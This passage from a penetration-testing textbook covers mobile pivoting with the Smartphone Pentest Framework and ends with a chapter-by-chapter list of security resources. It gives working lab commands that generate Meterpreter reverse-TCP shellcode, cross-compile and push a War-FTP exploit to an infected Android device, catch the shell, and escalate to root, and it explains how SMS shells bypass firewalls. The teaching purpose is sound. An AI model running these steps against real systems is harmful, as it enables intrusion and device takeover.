Host is up (0.0068s latency).
Not shown: 992 closed ports
PORT STATE SERVICE
21/tcp open ftp
--snip--
# Nmap done at Sun Sep 6 23:41:33 2015 -- 1 IP address (1 host up) scanned in 3.43 seconds
Listing 20-22: Nmap results
Rather than run an entire pentest using the exploited mobile device as
a pivot, let’s finish by running an exploit through the SPF agent.
Exploiting a System on the Local Network
Unfortunately, Android devices don’t know scripting languages such
as Python and Perl by default; to run an exploit, we need some C code.
A simple C version of the exploit we wrote for War-FTP 1.65 in Chapter 17
is in /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c.
The included shellcode runs a windows/meterpreter/reverse_tcp payload and
sends it back to 192.168.20.9 on port 4444. If your Kali system is at another
IP address, regenerate the shellcode with Msfvenom, as shown here. (Don’t
forget the bad characters for War-FTP from Chapter 17. We can avoid them
with Msfvenom using the -b flag.)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 -f c -b '\x00\x0a\x0d\x40'
Once you’ve replaced the shellcode in the exploit, if necessary, we need
to compile the C code to run on an Android device. If we use GCC, as in
Chapter 3, the exploit will run fine from our Kali box, but the ARM proces-
sor on our Android phones won’t know what to make of it.
We briefly ran into cross compilers for Windows in Chapter 12 that
allowed us to compile C code on Kali to run on Windows. We can do the
468 Chapter 20
same thing for Android as long as we have an ARM cross compiler. Luckily,
SPF has one. As shown in Listing 20-23, choose option 9.) Compile code to
run on mobile devices from the main menu.
spf> 9
Compile code to run on mobile devices
1.) Compile C code for ARM Android
spf> 1u
Compiles C code to run on ARM based Android devices. Supply the C code file and the output
filename
File to Compile: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.cv
Output File: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter
Listing 20-23: Compiling C code to run on Android
Select 1.) Compile C code for ARM Android u. You will be prompted for the
C file to compile as well as where you want to put the compiled binary v.
Now we need to download the War-FTP exploit to our infected Android
device. From the agent commands menu, choose option 6 to download a
file. You will be asked for the file to download and the delivery method, as
shown in Listing 20-24.
Select a command to perform or 0 to return to the previous menu
spf> 6
Downloads a file to the phone. Fill in the file and the delivery method(SMS or HTTP).
File to download: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter
Delivery Method(SMS or HTTP): HTTP
Listing 20-24: Downloading the exploit
Before we run the exploit, we need to set up a handler in Msfconsole,
as shown in Listing 20-25. Open Msfconsole on Kali, and use the multi/
handler module, setting the options to match the payload in the War-FTP
exploit.
msf > use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Starting the payload handler...
Listing 20-25: Setting up multi/handler
Finally, it’s time to run the exploit. As shown in Listing 20-26, choose
option 7.) Execute Command from the agent commands menu; you will be
prompted for the command to run.
Using the Smartphone Pentest Framework 469
Select a command to perform or 0 to return to the previous menu
spf> 7
Run a command in the terminal. Fill in the command and the delivery
method(SMS or HTTP).
Command: warftpmeterpreter 192.168.20.10 21u
Downloaded?: yesv
Delivery Method(SMS or HTTP): HTTP
Listing 20-26: Running the exploit
Tell SPF the full command, including arguments u. In this case, we
need to tell the exploit the IP address and port to attack. SPF asks if the
binary was downloaded. If it was downloaded through SPF, it will be in the
agent’s files directory, and SPF will need to know to run it from there. In
our case, we answer yes v, then enter the delivery method as usual.
Watch your Metasploit listener. In about a minute you should receive a
Meterpreter prompt like the one shown next.
meterpreter >
We’ve successfully used SPF as a pivot to run an attack. This may not
seem very exciting because the emulator, Kali, and the Windows XP target
are all on the same network, but if Kali is in the cloud and the Windows XP
target and an infected Android device are on the corporate network, this
process would be more useful. We can make it more interesting by using
command option 10.) TCP Listener to set up a listener to catch our shell on
the infected mobile device. Rather than calling back out to a listener on our
Kali machine, we can instead send our shell back to SPF directly using either
HTTP or SMS. Using SMS will, of course, allow us to completely bypass any
perimeter filtering such as firewalls and proxies that may inhibit getting
shells out of the network from your attacks. This is illustrated in Figure 20-5.
attacker-controlled
phone
attacker
computer
Internet
cell
tower(s)
local router
(bypassed)
local
exploited PC
local infected
phone
Figure 20-5: Bypassing perimeter controls with an SMS-based shell.
470 Chapter 20
note Aside from the privilege escalation example discussed next, there is no reason we
needed to use Android 2.2 as our target emulator. The other malicious app examples
we have used in this chapter will work on any version of Android.
Privilege Escalation
As a forked Linux kernel, Android shares some of Linux’s privilege escala-
tion vulnerabilities, as well as having a few security mistakes of its own. Even
OEMs have added bugs into their implementations of Android. For example,
in 2012, a privilege-escalation vulnerability was found in how Samsung
devices handled the camera memory if they used a certain kind of chip, giv-
ing attackers read/write access to all of memory.
If you want more permissions granted to your app, you can attempt to use
a known issue from the agent to get root privileges, as shown in Listing 20-27.
Commands:
--snip--
Select a command to perform or 0 to return to the previous menu
spf> 5
1.) Choose a Root Exploit
2.) Let SPF AutoSelect
Select an option or 0 to return to the previous menu
spf> 2u
Try a privilege escalation exploit.
Chosen Exploit: rageagainstthecagev
Delivery Method(SMS or HTTP): HTTPw
Listing 20-27: Running a privilege-escalation exploit
From the agent commands menu, choose option 5.) Privilege Escalation.
From here we have two options. We can manually choose an exploit from
the exploits for Android that SPF knows, or we can let SPF make a selection
based on the Android version number. Our Android 2.2 emulator is vulner-
able to an exploit known as Rage Against the Cage. Though this is an older
exploit, it works well on the emulator, so let’s allow SPF to automatically
select the exploit, as shown at u. Because this is Android 2.2, SPF correctly
selects rageagainstthecage v and asks for the delivery method w.
After giving the exploit a little time to run, check back with option 3
from the main menu. The Rooted field should read RageAgainstTheCage, as
shown here.
Rooted: RageAgainstTheCage
From here we have full control of the device. We can issue commands
from a root shell or reinstall the agent as a system app, giving us even more
privileges than the original app.
Using the Smartphone Pentest Framework 471
note This particular exploit is a resource exhaustion attack, so if you want to continue
using the emulator for additional exercises, you may want to restart it, as it may per-
form slower after this attack.
summary
In this chapter, we took a brief look at the relatively new and rapidly evolving
world of mobile exploitation. We used my SPF tool to run a variety of attacks,
primarily on emulated Android mobile devices. These attacks will, of course,
work on real devices in the same way. We looked at a remote attack that
checked for a default SSH password on jailbroken iPhones, and then studied
two client-side attack examples. One gave us a shell through a WebKit vulner-
ability in the browser, and the other remotely controlled the device through
USSD codes that were automatically dialed from a web page.
We moved on to malicious applications, backdooring legitimate source
code or compiled APK files with the SPF Android agent. We can use mobile-
attack vectors such as NFC and SMS to trick users into installing our mali-
cious app. Once the agent was installed, we ran attacks such as information
gathering and remote control, and we used SPF to escalate our privileges to
root using known vulnerabilities in the Android platform. Finally, we used
the SPF agent as a pivot to attack other devices in the network. We ran
Nmap from the Android device against our Windows XP target, and then
used a C exploit for War-FTP to exploit the Windows XP target from the
SPF agent.
Mobile device security is an exciting field that is adding new dimensions
to pentesting as the devices enter the workplace. As a pentester, knowing a
bit about mobile vulnerabilities will come in handy. As attackers use these
devices to gain sensitive data and a foothold in the network, pentesters must
be able to simulate these same threats.
472 Chapter 20
resourCes
Here are some resources that have helped me on my
journey through information security and continue to
serve as references as I learn more. Many are regularly
updated with the latest tools and techniques in their
area. I encourage you to refer to these resources as you
work through this book, so they are listed here by chap-
ter. At the end of the list are some excellent courses that
you might use to further your study of pentesting.
Chapter 0: Penetration Testing Primer
• NIST Technical Guide to Information Security Testing: http://csrc.nist
.gov/publications/nistpubs/800-115/SP800-115.pdf
• Penetration Testing Execution Standard (PTES): http://www.pentest
-standard.org/
Chapter 2: Using Kali Linux
• Command Line Kung Fu: http://blog.commandlinekungfu.com
• Introduction to the Command Line (Second Edition): The Fat Free Guide to
Unix and Linux Commands by Nicholas Marsh (2010)
• The Linux Command Line: A Complete Introduction by William E. Shotts, Jr.
(No Starch Press, 2012)
• Linux for Beginners and Command Line Kung Fu (Bundle): An Introduction
to the Linux Operating System and Command Line by Jason Cannon (2014)
Chapter 3: Programming
• Discovery: https://github.com/leebaird/discover/
• Stack Overflow: http://www.stackoverflow.com/
• Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers
and Security Engineers by T.J. O’Connor (Syngress, 2012)
Chapter 4: Using the Metasploit Framework
• Metasploit: The Penetration Tester’s Guide by David Kennedy, Jim O’Gorman,
Devon Kearns, and Mati Aharoni (No Starch Press, 2011)
• Metasploit blog: https://community.rapid7.com/community/metasploit/blog/
• Metasploit Minute show: http://hak5.org/category/episodes/metasploit-minute/
• Metasploit Unleashed: http://www.offensive-security.com/metasploit-unleashed/
Main_Page
Chapter 5: Information Gathering
• Google Hacking Database: http://www.hackersforcharity.org/ghdb/
• Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery
and Security Scanning by Gordon Fyodor Lyon (Nmap Project, 2009;
http://nmap.org/book/)
Chapter 6: Finding Vulnerabilities
• National Vulnerability Database CVSSv2: http://nvd.nist.gov/cvss.cfm/
• Tenable blog: http://www.tenable.com/blog/
Chapter 7: Capturing Traffic
• Counter Hack Reloaded: A Step-by-Step Guide to Computer Attacks and
Effective Defenses (2nd Edition) by Edward Skoudis and Tom Liston
(Prentice Hall, 2006)
474 Resources
• Ettercap: http://ettercap.github.io/ettercap/
• SSLStrip: http://www.thoughtcrime.org/software/sslstrip/
Chapter 8: Exploitation
• Exploit Database: http://www.exploit-db.com/
• Packet Storm: http://packetstormsecurity.com/
• SecurityFocus: http://www.securityfocus.com/
• VulnHub: http://vulnhub.com/
Chapter 9: Password attacks
• CloudCracker: https://www.cloudcracker.com/
• John the Ripper: http://www.openwall.com/john/
• Packet Storm wordlists: http://packetstormsecurity.com/Crackers/wordlists/
• RainbowCrack Project: http://project-rainbowcrack.com/table.htm
• White Chapel: http://github.com/mubix/WhiteChapel/
Chapter 11: Social Engineering
• Social-Engineer: http://www.social-engineer.org/
• TrustedSec: https://www.trustedsec.com/downloads/social-engineer-toolkit/
Chapter 12: Bypassing antivirus applications
• Pentest Geek: http://www.pentestgeek.com/2012/01/25/
using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/
• Veil-Evasion: https://github.com/Veil-Framework/Veil-Evasion/
Chapter 13: Post Exploitation
• Chris Gates’s blog, carnal0wnage: http://carnal0wnage.attackresearch.com/
• Carlos Perez’s blog: http://www.darkoperator.com/
• Obscuresec blog: http://obscuresecurity.blogspot.com/
• Pwn Wiki: http://pwnwiki.io/
• Rob Fuller’s blog: http://www.Room362.com/
Chapter 14: Web application Testing
• Damn Vulnerable Web App: http://www.dvwa.co.uk/
Resources 475
• Open Web Application Security Project (OWASP): https://www.owasp.org/
index.php/Main_Page
• OWASP WebGoat Project: https://www.owasp.org/index.php/Category
:OWASP_WebGoat_Project
Chapter 15: Wireless attacks
• Aircrack Wireless Tutorials: http://www.aircrack-ng.org/doku.php?id=tutorial
&DokuWiki=1b6b85cc29f360ca173a42b4ce60cc50
• BackTrack 5 Wireless Penetration Testing Beginner’s Guide by Vivek
Ramachandran (Packt Publishing, 2011)
Chapters 16–19: Exploit Development
• Corelan Team Tutorials: https://www.corelan.be/index.php/category/
security/exploit-writing-tutorials/
• FuzzySecurity: http://fuzzysecurity.com/
• Hacking, 2nd Edition: The Art of Exploitation by Jon Erickson (No Starch
Press, 2008)
Chapter 20: Using the Smartphone Pentest Framework
• Damn Vulnerable iPhone App: https://github.com/prateek147/DVIA/
• Drozer: https://www.mwrinfosecurity.com/products/drozer/
• OWASP mobile: https://www.owasp.org/index.php/OWASP_Mobile_
Security_Project
Courses
• Strategic Security (Joe McCray): http://strategicsec.com/
• Offensive Security: http://www.offensive-security.com/information
-security-training/
• Exploit Development Bootcamp (Peter Van Eeckhoutte): https://www
.corelan-training.com/index.php/training-2/bootcamp/
• Sam Bowne: http://samsclass.info/
• SecurityTube PentesterAcademy: http://www.pentesteracademy.com/
476 Resources